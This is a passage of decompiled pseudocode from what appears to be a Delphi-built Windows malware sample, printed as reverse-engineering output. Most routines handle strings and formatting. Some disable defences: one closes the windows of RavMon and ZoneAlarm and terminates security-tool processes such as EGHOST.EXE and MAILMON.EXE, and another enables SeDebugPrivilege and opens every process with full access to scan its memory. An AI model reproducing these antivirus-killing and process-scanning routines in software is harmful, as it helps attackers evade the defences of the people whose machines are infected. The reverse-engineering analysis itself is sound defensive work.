      if ( (int)v6[1] < 0 )
      {
        v7 = *v6 != 0;
        *v6 = -*v6;
        v6[1] += v7;
        v6[1] = -v6[1];
        sub_40C9E9((int)v6, a2);
        *(_BYTE *)(a3 - 1) = 45;
        return;
      }
LABEL_51:
      sub_40C9E9((int)v6, a2);
      return;
    case 1:
    case 7:
    case 8:
    case 9:
    case 0xE:
      goto LABEL_3;
    case 2:
      if ( v3 == 83 )
        return;
      goto LABEL_3;
    case 3:
      BYTE1(v4) = 0;
      goto LABEL_39;
    case 4:
      if ( v3 == 83 )
        return;
      goto LABEL_3;
    case 5:
      if ( v3 != 80 )
        goto LABEL_3;
      *(_DWORD *)(a2 - 36) = 8;
      goto LABEL_55;
    case 6:
      if ( v3 != 83 )
        goto LABEL_3;
      v9 = *(_BYTE **)a3;
      v10 = *(_DWORD *)(a2 - 36);
      if ( v10 )
      {
        do
        {
          if ( !v10 )
            break;
          v11 = *v9++ == 0;
          --v10;
        }
        while ( !v11 );
      }
      return;
    case 0xA:
      v8 = sub_40448C;
      goto LABEL_26;
    case 0xB:
      if ( v3 == 83 )
        return;
      goto LABEL_3;
    case 0xC:
      BYTE1(v4) = 1;
LABEL_39:
      a3 = *(_DWORD *)a3;
      LOBYTE(v4) = 0;
      if ( v3 == 71 || (LOBYTE(v4) = 1, v3 == 69) )
      {
        v12 = *(_DWORD *)(a2 - 36);
        v13 = 3;
        if ( v12 > 0x12 )
          v12 = 15;
      }
      else
      {
        LOBYTE(v4) = 2;
        if ( v3 != 70 )
        {
          LOBYTE(v4) = 3;
          if ( v3 != 78 )
          {
            if ( v3 != 77 )
              goto LABEL_3;
            LOBYTE(v4) = 4;
          }
        }
        v12 = 18;
        v13 = *(_DWORD *)(a2 - 36);
        if ( v13 > 0x12 )
        {
          v13 = 2;
          if ( v3 == 77 )
            v13 = (unsigned __int8)byte_42C9E0;
        }
      }
      sub_40C7F4(v13, v12, v4);
      return;
    case 0xD:
      if ( v3 != 83 )
        goto LABEL_3;
      if ( *(_WORD *)v5 > 1u )
        sub_40C7E0(v3, *(_DWORD *)a3);
      return;
    case 0xF:
      v8 = sub_4044EC;
LABEL_26:
      a3 = (int)v8 + *(_DWORD *)(a2 - 4);
      if ( v3 != 83 )
        goto LABEL_3;
      ((void (__fastcall *)(char, signed int))a3)(83, v5);
      return;
    case 0x10:
      goto LABEL_4;
  }
}
// 40C9C9: control flows out of bounds to 40C9EE
// 40CA66: control flows out of bounds to 40CA7F
// 40C9B8: variable 'v3' is possibly undefined
// 40C7D0: using guessed type int __thiscall nullsub_1(_DWORD);
// 42C9E0: using guessed type char byte_42C9E0;

//----- (0040C9E9) --------------------------------------------------------
int __usercall sub_40C9E9@<eax>(int a1@<ebx>, int a2@<ebp>)
{
  int v2; // ecx
  int v3; // esi
  unsigned __int8 v4; // dl
  int v5; // eax
  int v6; // edx
  int result; // eax
  unsigned int v8; // ecx
  unsigned int v9; // edx
  bool v10; // cc
  unsigned int v11; // edx
  int v12; // [esp-4h] [ebp-8h]
  unsigned __int64 *v13; // [esp+0h] [ebp-4h]

  v2 = 10;
  v3 = a2 - 81;
  do
  {
    v12 = v2;
    v4 = sub_4052D8(*(_QWORD *)a1, (unsigned int)v2) + 48;
    if ( v4 >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v3 = v4;
    a1 = *(_DWORD *)(a2 - 4);
    v5 = sub_405210(*v13, (unsigned int)v12);
    v2 = v12;
    *(_DWORD *)a1 = v5;
    *(_DWORD *)(a1 + 4) = v6;
    result = v6 | v5;
  }
  while ( result );
  v8 = a2 - 81 - v3;
  v9 = *(_DWORD *)(a2 - 36);
  if ( v9 <= 0x10 )
  {
    v10 = v9 <= v8;
    v11 = v9 - v8;
    if ( !v10 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v3 = 48;
        --v11;
      }
      while ( v11 );
    }
  }
  return result;
}
// 40CA19: variable 'v13' is possibly undefined
// 40CA2A: variable 'v6' is possibly undefined

//----- (0040CA7A) --------------------------------------------------------
unsigned int __usercall sub_40CA7A@<eax>(unsigned int result@<eax>, int a2@<ebp>)
{
  int v2; // esi
  unsigned int v3; // et2
  char v4; // dl
  unsigned int v5; // ecx
  unsigned int v6; // edx
  bool v7; // cc
  unsigned int v8; // edx

  v2 = a2 - 97;
  do
  {
    v3 = result % 0xA;
    result /= 0xAu;
    v4 = v3 + 48;
    if ( (unsigned __int8)(v3 + 48) >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v2 = v4;
  }
  while ( result );
  v5 = a2 - 97 - v2;
  v6 = *(_DWORD *)(a2 - 36);
  if ( v6 <= 0x10 )
  {
    v7 = v6 <= v5;
    v8 = v6 - v5;
    if ( !v7 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v2 = 48;
        --v8;
      }
      while ( v8 );
    }
  }
  return result;
}

//----- (0040CBF0) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_40CBF0(int a1@<ebp>)
{
  sub_40426C((_DWORD *)(a1 - 20));
}

//----- (0040CC10) --------------------------------------------------------
_DWORD *__userpurge sub_40CC10@<eax>(char **a1@<eax>, unsigned __int8 *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // ebx
  int v6; // eax
  unsigned __int8 *v7; // eax
  int v8; // eax
  char v10[8]; // [esp+0h] [ebp-1008h] BYREF
  char **v11; // [esp+8h] [ebp-1000h]
  int v12; // [esp+1000h] [ebp-8h]
  unsigned __int8 *v13; // [esp+1004h] [ebp-4h]

  v11 = a1;
  v12 = a3;
  v13 = a2;
  v5 = 4096;
  if ( sub_404524((int)a2) >= 3072 )
  {
    v7 = (unsigned __int8 *)sub_404524((int)v13);
    v5 = (int)v7;
  }
  else
  {
    v6 = sub_404524((int)v13);
    v7 = sub_40C7FC((int)v10, 0xFFFu, v13, a4, v12, v6);
  }
  if ( (int)v7 < v5 - 1 )
    return sub_40435C(a1, v10, (int)v7);
  while ( (int)v7 >= v5 - 1 )
  {
    v5 *= 2;
    sub_40426C(a1);
    sub_40484C(a1, v5);
    v8 = sub_404524((int)v13);
    v7 = sub_40C7FC((int)*a1, v5 - 1, v13, a4, v12, v8);
  }
  return sub_40484C(a1, (int)v7);
}

//----- (0040CCD0) --------------------------------------------------------
_DWORD *__userpurge sub_40CCD0@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4)
{
  return sub_40CC10(a4, a1, a2, a3);
}

//----- (0040CCE4) --------------------------------------------------------
__int64 __usercall sub_40CCE4@<edx:eax>(char *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  char v3; // bl
  unsigned __int8 v4; // cl
  unsigned int v6[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v7; // [esp-4h] [ebp-28h]
  char *v8; // [esp+8h] [ebp-1Ch] BYREF
  __int64 v9; // [esp+Ch] [ebp-18h]
  __int64 v10; // [esp+14h] [ebp-10h]
  char *v11; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v8 = 0;
  v11 = a1;
  sub_40470C((int)a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40CE1B;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40C214((int)v11, &v8);
  sub_404304((volatile __int32 *)&v11, (__int32)v8);
  v1 = sub_404524((int)v11);
  if ( v11[v1 - 1] == 72 )
  {
    v2 = sub_404524((int)v11);
    sub_4047BC(&v11, v2, 1);
  }
  v9 = 0i64;
  v3 = sub_404524((int)v11);
  if ( v3 )
  {
    v4 = 1;
    do
    {
      v9 *= 16i64;
      if ( (unsigned __int8)(v11[v4 - 1] - 48) >= 0xAu )
      {
        if ( (unsigned __int8)(v11[v4 - 1] - 65) >= 6u )
        {
          v9 = 0i64;
          break;
        }
        v9 += (unsigned __int8)v11[v4 - 1] - 55;
      }
      else
      {
        v9 += (unsigned __int8)v11[v4 - 1] - 48;
      }
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  v10 = v9;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40CE22;
  sub_40426C(&v8);
  sub_40426C(&v11);
  return v10;
}

//----- (0040CE30) --------------------------------------------------------
int sub_40CE30()
{
  HWND WindowA; // eax
  HWND v1; // eax
  HWND v2; // eax
  HWND Window; // ebx
  HWND DesktopWindow; // esi
  char v5; // zf
  HWND v6; // ebx
  HWND v7; // esi
  HWND v8; // eax
  HWND v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-88h] BYREF
  int *v12; // [esp-4h] [ebp-80h]
  char *v13; // [esp+Ch] [ebp-70h] BYREF
  char *v14; // [esp+10h] [ebp-6Ch] BYREF
  CHAR String[101]; // [esp+17h] [ebp-65h] BYREF
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_40CFC0;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  WindowA = FindWindowA(0, "RavMon.exe");
  SendMessageA(WindowA, 0x10u, 0, 0);
  sub_40D0BC((int)"RavMon.EXE");
  v1 = FindWindowA("Tapplication", "");
  SendMessageA(v1, 0x10u, 0, 0);
  v2 = FindWindowA("Tapplication", "");
  SendMessageA(v2, 0x10u, 0, 0);
  Window = 0;
  DesktopWindow = GetDesktopWindow();
  do
  {
    Window = FindWindowExA(DesktopWindow, Window, "TForm1", 0);
    GetWindowTextA(Window, String, 9);
    sub_4044D4(&v14, String, 101);
    Delphi_CompareCall_404668((int)v14, dword_40D038);
    if ( v5 )
      SendMessageA(Window, 0x10u, 0, 0);
  }
  while ( Window );
  v6 = 0;
  v7 = GetDesktopWindow();
  do
  {
    v6 = FindWindowExA(v7, v6, "TForm1", 0);
    GetWindowTextA(v6, String, 7);
    sub_4044D4(&v13, String, 101);
    Delphi_CompareCall_404668((int)v13, dword_40D04C);
    if ( v5 )
      SendMessageA(v6, 0x10u, 0, 0);
  }
  while ( v6 );
  v8 = FindWindowA("TfLockDownMain", 0);
  SendMessageA(v8, 0x10u, 0, 0);
  v9 = FindWindowA("ZAFrameWnd", "ZoneAlarm");
  SendMessageA(v9, 0x10u, 0, 0);
  sub_40D0BC((int)"EGHOST.EXE");
  sub_40D0BC((int)"MAILMON.EXE");
  sub_40D0BC((int)"netbargp.exe");
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40CFC7;
  return sub_404290((int)&v13, 2);
}
// 40CEEE: variable 'v5' is possibly undefined
// 40D038: using guessed type int dword_40D038[3];
// 40D04C: using guessed type int dword_40D04C[2];

//----- (0040D0BC) --------------------------------------------------------
int __usercall sub_40D0BC@<eax>(int a1@<eax>)
{
  int v1; // esi
  void *v2; // ebx
  int i; // eax
  char v4; // zf
  HANDLE v5; // eax
  char *v7; // [esp-10h] [ebp-164h]
  char *v8; // [esp-10h] [ebp-164h]
  unsigned int v9[2]; // [esp-Ch] [ebp-160h] BYREF
  int *v10; // [esp-4h] [ebp-158h]
  char *v11; // [esp+Ch] [ebp-148h] BYREF
  char *v12; // [esp+10h] [ebp-144h] BYREF
  char *v13; // [esp+14h] [ebp-140h] BYREF
  char *v14; // [esp+18h] [ebp-13Ch] BYREF
  char *v15; // [esp+1Ch] [ebp-138h] BYREF
  char *v16; // [esp+20h] [ebp-134h] BYREF
  char *v17; // [esp+24h] [ebp-130h] BYREF
  _DWORD v18[9]; // [esp+28h] [ebp-12Ch] BYREF
  char v19[260]; // [esp+4Ch] [ebp-108h] BYREF
  int v20; // [esp+150h] [ebp-4h] BYREF
  int savedregs; // [esp+154h] [ebp+0h] BYREF

  v13 = 0;
  v11 = 0;
  v12 = 0;
  v17 = 0;
  v14 = 0;
  v16 = 0;
  v15 = 0;
  v20 = a1;
  sub_40470C(a1);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_40D22A;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v1 = 0;
  v2 = (void *)sub_40B564(2, 0);
  v18[0] = 296;
  for ( i = sub_40B584((int)v2, (int)v18); i; i = sub_40B5A4((int)v2, (int)v18) )
  {
    sub_4044D4(&v15, v19, 260);
    sub_40C1CC((int)v15, &v16, v1);
    sub_40C214((int)v16, &v17);
    v7 = v17;
    sub_40C214(v20, &v14);
    Delphi_CompareCall_404668((int)v7, (int *)v14);
    if ( !v4 )
    {
      sub_4044D4(&v12, v19, 260);
      sub_40C214((int)v12, &v13);
      v8 = v13;
      sub_40C214(v20, &v11);
      Delphi_CompareCall_404668((int)v8, (int *)v11);
      if ( !v4 )
        continue;
    }
    v5 = OpenProcess(1u, 0, v18[2]);
    v1 = TerminateProcess(v5, 0);
  }
  CloseHandle_0(v2);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_40D231;
  sub_404290((int)&v11, 7);
  sub_40426C(&v20);
  return v1;
}
// 40D18D: variable 'v4' is possibly undefined
// 40D0BC: using guessed type _DWORD var_12C[9];

//----- (0040D23C) --------------------------------------------------------
int __usercall sub_40D23C@<eax>(char **a1@<eax>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  DWORD nSize; // [esp+4h] [ebp-8h] BYREF
  LPSTR lpBuffer; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  nSize = 16;
  lpBuffer = (LPSTR)sub_4026E0(16);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_40D296;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( GetComputerNameA(lpBuffer, &nSize) )
    sub_40445C(a1, lpBuffer);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_40D29D;
  return sub_402700((int)lpBuffer);
}

//----- (0040D2A4) --------------------------------------------------------
_DWORD *__userpurge sub_40D2A4@<eax>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, char **a4, char *a5)
{
  char *v7; // eax
  int PrivateProfileStringA; // eax
  char *v10; // [esp-14h] [ebp-820h]
  char *v11; // [esp-10h] [ebp-81Ch]
  char *v12; // [esp-4h] [ebp-810h]
  CHAR ReturnedString[2048]; // [esp+Ch] [ebp-800h] BYREF

  v12 = sub_40471C(a1);
  v11 = sub_40471C(a5);
  v10 = sub_40471C(a3);
  v7 = sub_40471C(a2);
  PrivateProfileStringA = GetPrivateProfileStringA(v7, v10, v11, ReturnedString, 0x800u, v12);
  return sub_40435C(a4, ReturnedString, PrivateProfileStringA);
}

//----- (0040D304) --------------------------------------------------------
char **__usercall sub_40D304@<eax>(char **a1@<eax>)
{
  char **result; // eax
  CHAR Buffer[268]; // [esp+0h] [ebp-10Ch] BYREF

  GetWindowsDirectoryA(Buffer, 0x104u);
  sub_4044D4(a1, Buffer, 261);
  result = (char **)sub_404524((int)*a1);
  if ( *((_BYTE *)result + (_DWORD)*a1 - 1) != 92 )
    return sub_40452C(a1, (__int32)&dword_40D358);
  return result;
}
// 40D358: using guessed type int dword_40D358;

//----- (0040D35C) --------------------------------------------------------
_DWORD *__usercall sub_40D35C@<eax>(int a1@<eax>, char **a2@<edx>, int a3@<esi>)
{
  int v5; // eax

  v5 = sub_404524(a1);
  if ( v5 >= 1 )
  {
    while ( *(_BYTE *)(a1 + v5 - 1) != 92 )
    {
      if ( !--v5 )
        return Delphi_Copy_40477C(a1, 1, a3, a2);
    }
    a3 = v5;
  }
  return Delphi_Copy_40477C(a1, 1, a3, a2);
}

//----- (0040D394) --------------------------------------------------------
int sub_40D394()
{
  int v0; // ebx
  struct _OSVERSIONINFOA v2; // [esp+0h] [ebp-98h] BYREF

  v0 = 0;
  v2.dwOSVersionInfoSize = 148;
  GetVersionExA(&v2);
  switch ( v2.dwPlatformId )
  {
    case 0u:
      return 1;
    case 1u:
      return 2;
    case 2u:
      return 3;
  }
  return v0;
}

//----- (0040D3D8) --------------------------------------------------------
int __usercall sub_40D3D8@<eax>(int a1@<eax>, char **a2@<edx>)
{
  void *v3; // esi
  int v4; // eax
  int v5; // ebx
  char v6; // zf
  char *v8; // [esp-10h] [ebp-164h]
  char *v9; // [esp-10h] [ebp-164h]
  unsigned int v10[2]; // [esp-Ch] [ebp-160h] BYREF
  int *v11; // [esp-4h] [ebp-158h]
  char *v12; // [esp+Ch] [ebp-148h] BYREF
  char *v13; // [esp+10h] [ebp-144h] BYREF
  char *v14; // [esp+14h] [ebp-140h] BYREF
  char *v15; // [esp+18h] [ebp-13Ch] BYREF
  char *v16; // [esp+1Ch] [ebp-138h] BYREF
  char *v17; // [esp+20h] [ebp-134h] BYREF
  char *v18; // [esp+24h] [ebp-130h] BYREF
  int v19[9]; // [esp+28h] [ebp-12Ch] BYREF
  char v20[260]; // [esp+4Ch] [ebp-108h] BYREF
  int v21; // [esp+150h] [ebp-4h] BYREF
  int savedregs; // [esp+154h] [ebp+0h] BYREF

  v14 = 0;
  v12 = 0;
  v13 = 0;
  v18 = 0;
  v15 = 0;
  v17 = 0;
  v16 = 0;
  v21 = a1;
  sub_40470C(a1);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40D553;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v3 = (void *)sub_40B564(2, 0);
  v19[0] = 296;
  v4 = sub_40B584((int)v3, (int)v19);
  v5 = 0;
  while ( v4 )
  {
    sub_4044D4(&v16, v20, 260);
    sub_40C1CC((int)v16, &v17, (int)v3);
    sub_40C214((int)v17, &v18);
    v8 = v18;
    sub_40C214(v21, &v15);
    Delphi_CompareCall_404668((int)v8, (int *)v15);
    if ( v6
      || (sub_4044D4(&v13, v20, 260),
          sub_40C214((int)v13, &v14),
          v9 = v14,
          sub_40C214(v21, &v12),
          Delphi_CompareCall_404668((int)v9, (int *)v12),
          v6) )
    {
      LOBYTE(v5) = 1;
      sub_4044D4(a2, v20, 260);
      break;
    }
    v4 = sub_40B5A4((int)v3, (int)v19);
  }
  CloseHandle_0(v3);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40D55A;
  sub_404290((int)&v12, 7);
  sub_40426C(&v21);
  return v5;
}
// 40D4B0: variable 'v6' is possibly undefined

//----- (0040D564) --------------------------------------------------------
int sub_40D564()
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v2; // [esp-8h] [ebp-28h]
  int *v3; // [esp-4h] [ebp-24h]
  _DWORD v4[2]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+8h] [ebp-18h]
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+10h] [ebp-10h] BYREF
  int v8; // [esp+14h] [ebp-Ch] BYREF
  int v9; // [esp+18h] [ebp-8h]
  int v10; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  if ( !(*(int (__stdcall **)(_DWORD, _DWORD, int *))off_42B8E0[0])(0, 0, &v8) )
  {
    v3 = &savedregs;
    v2 = &loc_40D623;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( !(*(int (__stdcall **)(int, const char *, _DWORD, int *))off_42B854[0])(v8, "\\Objects\\Processes", 0, &v7)
      && !((int (__stdcall *)(int))*off_42B9D8)(v8)
      && !((int (__stdcall *)(int, int, _DWORD, _DWORD *))*off_42B8A8)(v7, 1024, 0, v4) )
    {
      v9 = v5;
      v10 = v6;
      __writefsdword(0, (unsigned int)ExceptionList);
      ((void (__stdcall *)(int, void *, _DWORD, _DWORD, int, int, int, int, int, int, int))*off_42B858)(
        v7,
        &loc_40D62A,
        v4[0],
        v4[1],
        v5,
        v6,
        v7,
        v8,
        v5,
        v6,
        savedregs);
      return ((int (__stdcall *)(int))*off_42B96C)(v8);
    }
    sub_403D78((unsigned int)ExceptionList, (int)v2, (int)v3);
  }
  return v9;
}
// 42B854: using guessed type int *off_42B854[2];
// 42B858: using guessed type int *off_42B858;
// 42B8A8: using guessed type int *off_42B8A8;
// 42B8E0: using guessed type int *off_42B8E0[3];
// 42B96C: using guessed type int *off_42B96C;
// 42B9D8: using guessed type int *off_42B9D8;
// 40D564: using guessed type _DWORD var_20[2];

//----- (0040D648) --------------------------------------------------------
int __usercall sub_40D648@<eax>(unsigned __int8 a1@<al>)
{
  int v1; // ebx
  HANDLE CurrentProcess; // eax
  HANDLE TokenHandle; // [esp+4h] [ebp-1Ch] BYREF
  DWORD ReturnLength; // [esp+8h] [ebp-18h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-14h] BYREF

  v1 = 0;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 0x20u, &TokenHandle) )
  {
    LookupPrivilegeValueA(0, "SeDebugPrivilege", &NewState.Privileges[0].Luid);
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = dword_42B318[a1];
    AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, &ReturnLength);
    LOBYTE(v1) = GetLastError_0() == 0;
    CloseHandle_0(TokenHandle);
  }
  return v1;
}
// 42B318: using guessed type int dword_42B318[];

//----- (0040D6FC) --------------------------------------------------------
char __userpurge sub_40D6FC@<al>(int a1@<eax>, int a2@<ecx>, volatile __int32 *a3)
{
  int v4; // eax
  int v5; // edi
  int v6; // ebx
  char *v7; // eax
  int v8; // eax
  char *v9; // eax
  int v10; // eax
  int v12; // [esp-10h] [ebp-48h]
  int v13; // [esp-10h] [ebp-48h]
  char *v14; // [esp-10h] [ebp-48h]
  unsigned int v15[2]; // [esp-Ch] [ebp-44h] BYREF
  int *v16; // [esp-4h] [ebp-3Ch]
  char *v17; // [esp+Ch] [ebp-2Ch] BYREF
  char *v18; // [esp+10h] [ebp-28h] BYREF
  char v19[12]; // [esp+14h] [ebp-24h] BYREF
  char *v20; // [esp+20h] [ebp-18h] BYREF
  char *v21; // [esp+24h] [ebp-14h] BYREF
  unsigned int v22; // [esp+28h] [ebp-10h] BYREF
  int v23; // [esp+2Ch] [ebp-Ch] BYREF
  char v24; // [esp+33h] [ebp-5h]
  int v25; // [esp+34h] [ebp-4h] BYREF
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v23 = 0;
  v21 = 0;
  v20 = 0;
  v25 = a2;
  sub_40470C(a2);
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_40D894;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  sub_405748(&v23, (int)dword_40D6E0, (void *)1, 1024);
  sub_40B98C(a1, v23, 4096, (int)&v22);
  sub_405748(&v23, (int)dword_40D6E0, (void *)1, v22 >> 2);
  v24 = 0;
  v4 = sub_40558C(v23);
  if ( v4 - 1 >= 0 )
  {
    v5 = v4;
    v6 = 0;
    while ( 1 )
    {
      sub_40484C(&v21, 261);
      v12 = sub_404524((int)v21);
      v7 = sub_40471C(v21);
      v8 = sub_40B9BC(a1, *(_DWORD *)(v23 + 4 * v6), (int)v7, v12);
      sub_40484C(&v21, v8);
      sub_40484C(&v20, 261);
      v13 = sub_404524((int)v20);
      v9 = sub_40471C(v20);
      v10 = sub_40B9EC(a1, *(_DWORD *)(v23 + 4 * v6), (int)v9, v13);
      sub_40484C(&v20, v10);
      sub_40BA1C(a1, *(_DWORD *)(v23 + 4 * v6), (int)v19, 12);
      sub_40C214((int)v21, &v18);
      v14 = v18;
      sub_40C214(v25, &v17);
      if ( (int)sub_404804(v17, v14) > 0 )
        break;
      ++v6;
      if ( !--v5 )
        goto LABEL_6;
    }
    v24 = 1;
    sub_4042C0(a3, (__int32)v20);
  }
LABEL_6:
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_40D89B;
  sub_404290((int)&v17, 2);
  sub_404290((int)&v20, 2);
  sub_405868(&v23, (int)dword_40D6E0);
  sub_40426C(&v25);
  return v24;
}
// 40D6E0: using guessed type int dword_40D6E0[3];
// 40D6FC: using guessed type int var_C;
// 40D6FC: using guessed type char var_24[12];

//----- (0040D8C8) --------------------------------------------------------
char __usercall sub_40D8C8@<al>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  int v2; // edx
  unsigned int v3; // edi
  int v4; // esi
  HANDLE v5; // eax
  void *v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v9; // [esp-4h] [ebp-30h]
  unsigned int v10; // [esp+Ch] [ebp-20h] BYREF
  int v11; // [esp+10h] [ebp-1Ch] BYREF
  int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  char v14; // [esp+23h] [ebp-9h]
  volatile __int32 *v15; // [esp+24h] [ebp-8h]
  int v16; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v11 = 0;
  v15 = a2;
  v16 = a1;
  sub_40470C(a1);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40D9B4;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v14 = 0;
  sub_40D648(1u);
  v12 = sub_40D564();
  v13 = v2;
  sub_405748(&v11, (int)dword_40D8AC, (void *)1, v12);
  sub_40B968(v11, 4 * v12, (int)&v10);
  v12 = v10 >> 2;
  v13 = 0;
  if ( (int)((v10 >> 2) - 1) >= 2 )
  {
    v3 = (v10 >> 2) - 3 + 1;
    v4 = 2;
    do
    {
      v5 = OpenProcess(0x1F0FFFu, 0, *(_DWORD *)(v11 + 4 * v4));
      v6 = v5;
      if ( v5 )
        v14 = sub_40D6FC((int)v5, v16, v15);
      CloseHandle_0(v6);
      if ( v14 )
        break;
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_40D9BB;
  sub_405868(&v11, (int)dword_40D8AC);
  sub_40426C(&v16);
  return v14;
}
// 40D905: variable 'v2' is possibly undefined
// 40D8AC: using guessed type int dword_40D8AC[3];

//----- (0040D9C8) --------------------------------------------------------
int __usercall sub_40D9C8@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  int v3; // ebx
  int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v7; // [esp-4h] [ebp-Ch]
  int v8; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = a1;
  sub_40470C(a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40DA23;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( (unsigned int)(sub_40D394() - 1) >= 2 )
  {
    LOBYTE(v4) = sub_40D8C8(v8, a2);
    v3 = v4;
  }
  else
  {
    v3 = sub_40D3D8(v8, (char **)a2);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40DA2A;
  sub_40426C(&v8);
  return v3;
}
// 40DA0B: variable 'v4' is possibly undefined

//----- (0040DA30) --------------------------------------------------------
_DWORD *__userpurge sub_40DA30@<eax>(int a1@<eax>, char **a2@<edx>, char a3, int a4)
{
  int v5; // [esp+0h] [ebp-10h] BYREF
  char v6; // [esp+4h] [ebp-Ch]
  char *v7; // [esp+8h] [ebp-8h]
  char v8; // [esp+Ch] [ebp-4h]

  v5 = a1;
  v6 = 0;
  v7 = &a3;
  v8 = 16;
  return sub_40CC10(a2, "%.*x", (int)&v5, 1);
}

//----- (0040DA70) --------------------------------------------------------
int __usercall sub_40DA70@<eax>(
        int a1@<eax>,
        char a2@<dl>,
        volatile __int32 *a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  int v8; // esi
  char v9; // zf
  unsigned int v11[2]; // [esp-18h] [ebp-28h] BYREF
  int *v12; // [esp-10h] [ebp-20h]
  int v13; // [esp-Ch] [ebp-1Ch]
  int v14; // [esp-8h] [ebp-18h]
  int v15; // [esp-4h] [ebp-14h]
  char *v16; // [esp+0h] [ebp-10h] BYREF
  char *v17; // [esp+4h] [ebp-Ch] BYREF
  char *v18; // [esp+8h] [ebp-8h] BYREF
  int v19; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a4;
  v14 = a6;
  v13 = a5;
  v19 = a1;
  sub_40470C(a1);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_40DB30;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v8 = 1;
  sub_40426C(&v17);
  while ( v8 < sub_404524(v19) )
  {
    Delphi_Copy_40477C(v19, v8, 2, &v18);
    Delphi_CompareCall_404668((int)v18, dword_40DB48);
    if ( v9 )
    {
      if ( !a2 )
        sub_40452C(&v17, (__int32)&dword_40DB54);
    }
    else
    {
      sub_40CCE4(v18);
      sub_40444C(&v16);
      sub_40452C(&v17, (__int32)v16);
    }
    v8 += 2;
  }
  sub_4042C0(a3, (__int32)v17);
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40DB37;
  return sub_404290((int)&v16, 4);
}
// 40DA70: could not find valid save-restore pair for ebx
// 40DA70: could not find valid save-restore pair for edi
// 40DA70: could not find valid save-restore pair for esi
// 40DACA: variable 'v9' is possibly undefined
// 40DB48: using guessed type int dword_40DB48[3];
// 40DB54: using guessed type int dword_40DB54;

